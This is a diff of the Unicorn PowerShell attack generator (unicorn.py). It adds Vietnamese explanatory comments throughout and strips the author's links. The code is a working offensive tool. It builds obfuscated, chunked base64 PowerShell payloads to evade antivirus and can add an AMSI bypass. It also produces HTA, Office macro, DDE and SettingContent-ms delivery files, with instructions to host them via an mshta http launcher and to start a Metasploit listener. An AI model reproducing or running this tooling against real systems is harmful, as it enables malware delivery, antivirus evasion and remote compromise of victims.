-        sys.exit()
-
+        sys.exit() #kết thúc chương trình
+    #Nếu PRINT_DECODED không bật, hàm sẽ trả về giá trị của powershell_code để sử dụng trong các phần khác của chương trình.
     return powershell_code
 
-def gen_ps1_attack(ps1path):
-    if os.path.isfile(ps1path):
-        with open(ps1path, 'r') as scriptfile:
+def gen_ps1_attack(ps1path): #Hàm này nhận một đường dẫn tới một file PowerShell (ps1path) làm đối số. 
+    if os.path.isfile(ps1path): #Kiểm tra xem file có tồn tại hay không. Nếu có, đọc nội dung của file và trả về dữ liệu đó
+        with open(ps1path, 'r') as scriptfile: 
             data = scriptfile.read()
             return data
-    else:
+    else: #Nếu file không tồn tại, in một thông báo lỗi và kết thúc chương trình
         print("[!] {0} does not exist. Please check your path".format(ps1path))
         sys.exit(1)
 
 
 def format_payload(powershell_code, attack_type, attack_modifier, option):
-    gen_unicorn()
-    print("Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)")
-    print("Twitter: @TrustedSec, @HackingDave")
+    gen_unicorn() # Gọi hàm gen_unicorn(). Có vẻ như đây là một hàm nằm ở nơi khác trong mã nguồn.
+    # In ra các thông điệp chào mừng và tác giả
+    print("Written by: Dave Kennedy at TrustedSec ")
+    print("Twitter: ")
     print("\nHappy Magic Unicorns.")
-
+    # Tạo các chuỗi ngẫu nhiên (random strings)
     ran1 = generate_random_string(2, 3)
     ran2 = generate_random_string(2, 3)
     ran3 = generate_random_string(2, 3)
     ran4 = generate_random_string(2, 3)
 
-    # format payload is for adding chunking to evade detection
+    # Mã hóa mã PowerShell thành mã Base64 sử dụng UTF-16 LE encoding.
     avblah = base64.b64encode(powershell_code.encode('utf_16_le')) # kinder gentler dave variable name now
-    # here we mangle our encodedcommand by splitting it up in random chunks
+    # Là một số nguyên ngẫu nhiên trong khoảng từ 4000 đến 5000.
     avsux = randomint = random.randint(4000,5000)
+    # Chia chuỗi mã Base64 thành các đoạn có độ dài avsux.
     avnotftw = [avblah[i: i + avsux] for i in range(0, len(avblah), avsux)]
+    # Mangle các đoạn mã và tạo payload cuối cùng
     haha_av = ""
     counter = 0
     for non_signature in avnotftw:
@@ -978,10 +1020,10 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
         counter = 1
     random_quotes = ["''", '\\"\\"' ]
     mangle_quotes = (random.choice(random_quotes))
-
+    # Tạo chuỗi PowerShell cuối cùng
     full_attack = '''powershell /w 1 /C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
 
-    # if we want to use AMSI bypassing
+    # Kiểm tra và thêm AMSI bypass nếu được kích hoạt
     if AMSI_BYPASS.lower() == "on": 
 
         random_symbols = ['!', '@', '#', '%', '^', '&', '*', '(', ')', '-', '+', '=', '{', '}', '|', '.', ':', ';', '<', '>', '?', '/']
@@ -1007,17 +1049,18 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
 
     # powershell -w 1 -C "powershell ([char]45+[char]101+[char]99) YwBhAGwAYwA="  <-- Another nasty one that should evade. If you are reading the source, feel free to use and tweak
 
-    # for cobalt strike
+    # Chương trình sẽ kiểm tra nếu attack_type là "cs".
     if attack_type == "cs":
 
-        # generate the hta attack vector with cobalt strike
-        if attack_modifier == "hta":
+        # Xử lý các tùy chọn của attack_modifier
+        if attack_modifier == "hta": #Xử lý tấn công HTA
             gen_hta_attack(full_attack)
             cobalt_strike()
             hta_help()
             print("[*] Exported the hta attack vector to hta_attack/. This folder contains everything you need. Enjoy!\n")
 
         elif attack_modifier == "ms":
+	    # Xử lý tấn công Standalone_NoASR.SettingContent-ms
             ms_voodoo_stuff()
             gen_hta_attack(full_attack)
             cobalt_strike()
@@ -1028,6 +1071,7 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
             print("[*] Example step: Start Apache and move contents of hta_attack/ to /var/www/html/, and edit .SettingContent-ms with mshta http://<ip_of_apache>.")
 
         elif attack_modifier == "macro":
+	    # Xử lý tấn công Macro
             macro_attack = generate_macro(full_attack)
             write_file("powershell_attack.txt", macro_attack)
             cobalt_strike()
@@ -1035,19 +1079,20 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
             print("[*] Exported the Cobalt Strike Unicorn Attack for Macros out to powershell_attack.txt. Enjoy!\n")
 
         else:
+  	    # Xử lý mặc định
             write_file("powershell_attack.txt", full_attack)
             cobalt_strike()
             print("[*] Exported the Cobalt Strike Unicorn Attack codebase out to powershell_attack.txt. Enjoy!\n")
 
-    # for custom shellcode
+    # Chương trình sẽ kiểm tra nếu attack_type là "shellcode".
     if attack_type == "shellcode":
-        if attack_modifier == "hta":
+        if attack_modifier == "hta": # Xử lý tấn công HTA
             gen_hta_attack(full_attack)
             custom_shellcode()
             hta_help()
             print("[*] Exported the hta attack vector to hta_attack/. This folder contains everything you need. Enjoy!\n")
 
-        elif attack_modifier == "ms":
+        elif attack_modifier == "ms": # Xử lý tấn công Standalone_NoASR.SettingContent-ms
             ms_voodoo_stuff()
             gen_hta_attack(full_attack)
             custom_shellcode()
@@ -1057,14 +1102,15 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
             print("[*] Edit the Standalone_NoASR.SettingContent-ms and replace the section 'REPLACECOOLSTUFFHERE' with something like mshta http://<ip_or_dns_to_server/Launcher.hta")
             print("[*] Example step: Start Apache and move contents of hta_attack/ to /var/www/html/, and edit .SettingContent-ms with mshta http://<ip_of_apache>.")
 
-        elif attack_modifier == "macro":
+        elif attack_modifier == "macro": # Xử lý tấn công Macro
             macro_attack = generate_macro(full_attack)
             write_file("powershell_attack.txt", macro_attack)
             custom_shellcode()
             macro_help()
 
         else:
-            # add HTA option for shellcode
+	    # Xử lý mặc định
+            # Thêm tùy chọn HTA cho shellcode
             if "hta" in sys.argv:
                 gen_hta_attack(full_attack)
                 print("[*] Exported the custom shellcode to the hta generation under the hta_attacks folder. Enjoy!|n")
@@ -1078,19 +1124,19 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
                 print("[*] Exported the Custom Shellcode Attack codebase out to powershell_attack.txt. Enjoy!\n")
 
     if attack_type == "msf" or attack_type == "download/exec":
-        if attack_modifier == "macro":
+        if attack_modifier == "macro":  # Xử lý tấn công Macro
             macro_attack = generate_macro(full_attack)
             write_file("powershell_attack.txt", macro_attack)
             macro_help()
 
-        elif attack_modifier == "hta":
-            gen_hta_attack(full_attack)
+        elif attack_modifier == "hta": # Chương trình sẽ kiểm tra nếu attack_type là "msf" hoặc "download/exec".
+            gen_hta_attack(full_attack) # Xử lý tấn công HTA
             # move unicorn to hta attack if hta specified
             shutil.move("unicorn.rc", "hta_attack/")
             hta_help()
 
         elif attack_modifier == "ms":
-            ms_voodoo_stuff()
+            ms_voodoo_stuff() # Xử lý tấn công Standalone_NoASR.SettingContent-ms
             gen_hta_attack(full_attack)
             custom_shellcode()
             shutil.move("Standalone_NoASR.SettingContent-ms", "hta_attack/")
@@ -1122,23 +1168,23 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
 
             write_file("powershell_attack.txt", full_attack)
             if attack_modifier != "dde":
-                if AMSI_BYPASS.lower() == "on": amsi_help() # print the AMSI bypass language
-                ps_help() # present normal powershell attack instructions
-
-            # if we are using dde attack, present that method
-            if attack_modifier == "dde":
+                if AMSI_BYPASS.lower() == "on": amsi_help() # Xuất hướng dẫn bypass AMSI
+                ps_help()  # Xuất hướng dẫn powershell attack
+            # Nếu sử dụng dạng tấn công dde, xuất thông báo cho phương pháp đó
+            if attack_modifier == "dde": #Nếu attack_type không phải là "dde", thì thực hiện một số kiểm tra và xuất kết quả tương ứng.
                 dde_help()
 
-    elif attack_type == "custom_ps1":
+    elif attack_type == "custom_ps1": # Chương trình sẽ kiểm tra nếu attack_type là "custom_ps1".
         if attack_modifier == "macro":
-            macro_attack = generate_macro(full_attack, option)
+            macro_attack = generate_macro(full_attack, option) # Xử lý tấn công Macro
             write_file("powershell_attack.txt", macro_attack)
         else:
-            write_file("powershell_attack.txt", full_attack)
+            write_file("powershell_attack.txt", full_attack) # Xử lý mặc định
 
-        custom_ps1_help()
+        custom_ps1_help() # Cuối cùng, chương trình sẽ gọi hàm custom_ps1_help() để xuất thông báo và hướng dẫn.
 
-    else:
+    else: 
+    #Nếu attack_type không phải là "cs", attack_type không phải là "shellcode", attack_modifier không phải là "hta", và attack_modifier không phải là "macro", thì chương trình sẽ thực hiện các kiểm tra và xuất kết quả tương ứng.
         if attack_type != "cs":
             if attack_type != "shellcode":
                 if attack_modifier != "hta":
@@ -1146,49 +1192,49 @@ def format_payload(powershell_code, attack_type, attack_modifier, option):
                        write_file("powershell_attack.txt", full_attack)
                        ps_help()
 
-    # Print completion messages
+    # Nếu attack_type là "msf" và attack_modifier là "hta", thì chương trình sẽ xuất thông báo về việc xuất các file "index.html", "Launcher.hta", và "unicorn.rc" vào thư mục "hta_attack/". Sau đó, xuất một thông báo hướng dẫn về cách khởi chạy Metasploit Console để lắng nghe và chuyển các file "index" và "launcher" lên web server
     if attack_type == "msf" and attack_modifier == "hta":
         print("[*] Exported index.html, Launcher.hta, and unicorn.rc under hta_attack/.")
         print("[*] Run msfconsole -r unicorn.rc to launch listener and move index and launcher to web server.\n")
-
-    elif attack_type == "msf" or attack_type =="download/exec":
+    
+    elif attack_type == "msf" or attack_type =="download/exec": # chương trình sẽ xuất thông báo về việc xuất mã Powershell ra file "powershell_attack.txt".
         print("[*] Exported powershell output code to powershell_attack.txt.")
-        if attack_type != "download/exec":
+        if attack_type != "download/exec": #không phải là "download/exec", thì xuất thông báo về việc xuất file RC của Metasploit là "unicorn.rc" và hướng dẫn chạy Metasploit Console để thực hiện và tạo lắng nghe.
             print("[*] Exported Metasploit RC file as unicorn.rc. Run msfconsole -r unicorn.rc to execute and create listener.")
 
-        if attack_type == "download/exec":
+        if attack_type == "download/exec": #xuất thông báo về việc đây không phải là tấn công dựa trên Metasploit mà là custom shellcode, và cảnh báo về việc cần có một lắng nghe được thiết lập.
             print("[*] This attack does not rely on Metasploit, its custom shellcode. Whatever you execute, if its a payload that is a reverse connection, make sure you have a listener setup.")
 
-        if attack_modifier == "dde":
+        if attack_modifier == "dde": #xuất thông báo về việc xuất file "download.ps1" dùng cho việc thực hiện mã lệnh. (READ INSTRUCTIONS)
             print("[*] Exported download.ps1 which is what you use for code execution. (READ INSTRUCTIONS)")
         print("\n")
 
-    elif attack_type == "custom_ps1":
+    elif attack_type == "custom_ps1": #Nếu attack_type là "custom_ps1", chương trình sẽ xuất thông báo về việc xuất mã Powershell ra file "powershell_attack.txt".
         print("[*] Exported powershell output code to powershell_attack.txt")
 
 
-# This is the SettingContent-ms filetype based on research here: https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39
+# Mở và đọc nội dung từ file Standalone_NoASR.SettingContent-ms trong thư mục templates
 def ms_voodoo_stuff():
     # read file content in
     ms_input = open("templates/Standalone_NoASR.SettingContent-ms", "r").read()
-    # write the content out
+    # Ghi nội dung đã đọc ra file Standalone_NoASR.SettingContent-ms trong thư mục hiện tại
     write_file("Standalone_NoASR.SettingContent-ms", ms_input)
     settings_ms()
 
-# pull the variables needed for usage
+# Các biến này sẽ được sử dụng sau đó để xác định loại tấn công, sửa đổi, và đường dẫn PowerShell.
 try:
     attack_type = ""
     attack_modifier = ""
     payload = ""
     ps1path = ""
 
-    if len(sys.argv) > 1:
-        os.system("clear")
-        gen_unicorn()
+    if len(sys.argv) > 1: # Kiểm tra xem có ít nhất một tham số dòng lệnh được truyền không.
+        os.system("clear") # để xóa màn hình (lệnh này phụ thuộc vào hệ điều hành).
+        gen_unicorn() # có thể là một hàm để hiển thị banner hoặc thông điệp khác.
         payload_options = ["powershell","macro","hta","cert","custom","dde","cobalt","general"]
         help_options = ["-h","--help"]
 
-        if len(sys.argv) > 2:
+        if len(sys.argv) > 2: # Kiểm tra xem tham số dòng lệnh thứ hai có nằm trong danh sách các lựa chọn không. Nếu có tham số thứ hai và nó nằm trong danh sách các lựa chọn, chương trình sẽ hiển thị trợ giúp cho lựa chọn đó và thoát.
             if sys.argv[2] in payload_options:
                 # Show help for specific payload options
                 if sys.argv[2] == "powershell":
@@ -1223,7 +1269,7 @@ try:
                 elif sys.argv[2] == "general":
                     gen_usage()
                     sys.exit()
-        elif len(sys.argv) <= 2 and sys.argv[1] in help_options:
+        elif len(sys.argv) <= 2 and sys.argv[1] in help_options: # Kiểm tra xem tham số dòng lệnh có phải là "-h" hoặc "--help" không
             # Show all help menus if none specified
             ps_help()
             macro_help()
@@ -1235,28 +1281,30 @@ try:
             gen_usage()
             sys.exit()
 
-        # if using a 64 bit payload then downgrade to 32 bit. The way unicorn works is by doing whats called an x86 downgrade attack so there is$
+        # Kiểm tra x64 meterpreter payload
         if ("windows/x64/meterpreter") in sys.argv[1]:
+	# In cảnh báo và sửa đổi tham số dòng lệnh nếu payload là x64
             print("[!] WARNING: x64 meterpreter payload selected which is not compatible. Unicorn handles shellcode creation on both 32 and 64 by using an x86 downgrade attack regardless of 32 and 64 bit platforms. No interaction needed, downgrading to 32-bit payload.")
             sys.argv[1] = sys.argv[1].replace("windows/x64/", "windows/")
 
-        # settings option for SettingContent-ms filetype attack vector
+        # Kiểm tra loại tấn công là "ms"
+	# Nếu không phải là "ms", kiểm tra các điều kiện sau đây để xác định loại tấn công và các tham số liên quan.
         if sys.argv[1] == "ms":
             attack_type = ("ms")
-
+	# Xác định loại tấn công và các tham số liên quan khác
         else:
-            if len(sys.argv) > 2 and sys.argv[2] == "crt":
+            if len(sys.argv) > 2 and sys.argv[2] == "crt": #Nếu có thêm tham số (len(sys.argv) > 2) và tham số thứ hai là "crt", thiết lập attack_type là "crt" và payload bằng tham số đầu tiên.
                 attack_type = "crt"
                 payload = sys.argv[1]
             elif re.search('\.ps1$', sys.argv[1]) is not None:
-                attack_type = "custom_ps1"
+                attack_type = "custom_ps1" # Nếu tham số đầu tiên là một tệp PowerShell script (kết thúc bằng .ps1), thiết lập attack_type là "custom_ps1" và ps1path bằng tham số đầu tiên.
                 ps1path = sys.argv[1]
-
+	    # Nếu tham số đầu tiên là "windows/download_exec", thiết lập attack_type là "download/exec", port là "none", và nếu "macro" cũng là một tham số, thiết lập attack_modifier là "macro".
             elif sys.argv[1] =="windows/download_exec":
                 attack_type = "download/exec"
                 port = "none"
                 if "macro" in sys.argv: attack_modifier = "macro"
-
+	    # Nếu tham số thứ hai là "cs", thiết lập attack_type là "cs" và kiểm tra các điều kiện bổ sung trong khối if.
             elif sys.argv[2] == "cs":
                 attack_type = "cs"
 
@@ -1270,20 +1318,22 @@ try:
                 # using macro attack within custom shellcode or co balt strike
                 if "macro" in sys.argv:
                     attack_modifier = "macro"
-
+	    # Nếu tham số thứ hai là "shellcode", thiết lập attack_type là "shellcode".
             elif sys.argv[2] == "shellcode":
                 attack_type = "shellcode"
-
+	    # Nếu không phải bất kỳ điều kiện nào trên, thiết lập attack_type là "msf" và payload bằng tham số đầu tiên.
             else:
                 attack_type = "msf"
                 payload = sys.argv[1]
 
     # if we are using macros
-    if len(sys.argv) == 5:
+    # Kiểm tra số lượng tham số dòng lệnh, Mã kiểm tra số lượng tham số dòng lệnh và thực hiện các xử lý tùy thuộc vào số lượng tham số.
+    # Các khối mã trong mỗi điều kiện kiểm tra số lượng tham số dòng lệnh xử lý các trường hợp cụ thể tùy thuộc vào attack_type, attack_modifier, và các thông tin khác
+    if len(sys.argv) == 5: ## Xử lý khi có 5 tham số dòng lệnh
         if attack_type == "msf":  # msf macro attack
             ipaddr = sys.argv[2]
             port = sys.argv[3]
-            attack_modifier = sys.argv[4]
+            attack_modifier = sys.argv[4] 
             ps = gen_shellcode_attack(payload, ipaddr, port)
 
         else:
@@ -1292,7 +1342,7 @@ try:
 
         format_payload(ps, attack_type, attack_modifier, None)
 
-    # this is our cobalt strike and custom shellcode menu
+    # Xử lý khi attack_type là "cs" hoặc "shellcode"
     elif attack_type == "cs" or attack_type == "shellcode": 
         if not os.path.isfile(sys.argv[1]): 
             print("[!] File not found. Check the path and try again.")
@@ -1323,7 +1373,7 @@ try:
 
         format_payload(ps, attack_type, attack_modifier, None)
 
-    # default unicorn & custom ps1 macro attacks
+    # Xử lý khi có 4 tham số dòng lệnh hoặc attack_type là "download/exec"
     elif len(sys.argv) == 4 or attack_type == "download/exec":
         if attack_type == "custom_ps1":  # custom ps1 macro attack
             attack_modifier = sys.argv[2]
@@ -1347,7 +1397,7 @@ try:
 
         format_payload(ps, attack_type, attack_modifier, option)
 
-    elif len(sys.argv) == 3:
+    elif len(sys.argv) == 3:  # Xử lý khi có 3 tham số dòng lệnh
         # Matthews base64 cert attack or cs
         if attack_type == "crt":
             cert_help()
@@ -1362,7 +1412,7 @@ try:
             print("[!] Options not understood or missing. Use --help switch for assistance.")
             sys.exit()
 
-    elif len(sys.argv) == 2:
+    elif len(sys.argv) == 2: # Xử lý khi có 2 tham số dòng lệnh
         if attack_type == "custom_ps1":
             ps = gen_ps1_attack(ps1path)
             format_payload(ps, attack_type, None, None)
@@ -1375,15 +1425,15 @@ try:
             print("[!] Options not understood or missing. Use --help switch for assistance.")
             sys.exit()
 
-    # if we did supply parameters
+    # Xử lý khi có ít hơn 2 tham số dòng lệnh
     elif len(sys.argv) < 2:
         gen_unicorn()
         gen_usage()
 
-except KeyboardInterrupt:
+except KeyboardInterrupt:  # Xử lý khi người dùng bấm Ctrl+C để thoát
     print("\nExiting Unicorn... May the magical unicorn force flow through you.\n")
     sys.exit()
 
-except Exception as e:
+except Exception as e: # Xử lý các ngoại lệ chung và in ra thông báo lỗi
     if "list index" in str(e): print("[!] It appears you did not follow the right syntax for Unicorn. Try again, run python3 unicorn.py for all usage.")
     else: print("[!] Something went wrong, printing the error: " + str(e))
